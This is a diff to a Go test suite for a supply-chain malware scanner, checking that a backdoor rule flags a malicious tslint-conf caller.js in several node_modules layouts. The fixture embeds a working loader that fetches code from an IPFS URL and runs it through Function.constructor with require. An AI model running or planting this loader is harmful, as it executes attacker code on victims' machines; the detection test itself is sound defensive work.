@@ -189,6 +189,57 @@ func TestScan_JscramblerPayloadUnderNodeModules(t *testing.T) {
 	}
 }
 
+// TestScan_NodemonSudoTslintConfBackdoorUnderNodeModules asserts the default
+// walker stays bounded while checking this campaign's exact package-root IOC.
+func TestScan_NodemonSudoTslintConfBackdoorUnderNodeModules(t *testing.T) {
+	raw := []byte(`const src = 'https://peach-eligible-penguin-917.mypinata.cloud/ipfs/bafkreigjnxn5vnn34rc5r43ajwwkmk4akqpm4awmq5gdhakgszpeqiffsu';
+const s = (await axios.get(src)).data.cookie;
+const handler = new Function.constructor('require', s);
+handler(require);`)
+	layouts := []struct {
+		name string
+		rel  string
+	}{
+		{"hoisted", filepath.Join("node_modules", "tslint-conf", "lib", "caller.js")},
+		{"nested-npm", filepath.Join("node_modules", "nodemon-sudo", "node_modules", "tslint-conf", "lib", "caller.js")},
+		{"pnpm-store", filepath.Join("node_modules", ".pnpm", "tslint-conf@7.2.1", "node_modules", "tslint-conf", "lib", "caller.js")},
+	}
+	for _, layout := range layouts {
+		t.Run(layout.name, func(t *testing.T) {
+			root := t.TempDir()
+			payload := filepath.Join(root, layout.rel)
+			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(payload, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			lookalike := filepath.Join(root, "node_modules", "other", "lib", "caller.js")
+			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+			if err != nil {
+				t.Fatalf("scan: %v", err)
+			}
+			got := 0
+			for _, f := range res.Findings {
+				if f.RuleID == "nodemon-sudo-tslint-conf-backdoor-ioc" {
+					got++
+				}
+			}
+			if got != 1 {
+				t.Fatalf("nodemon-sudo-tslint-conf-backdoor-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
+			}
+		})
+	}
+}
+
 // TestScan_TimeoutHonored asserts that ScanTimeout terminates a slow scan
 // gracefully and still returns the partial result.
 func TestScan_TimeoutHonored(t *testing.T) {
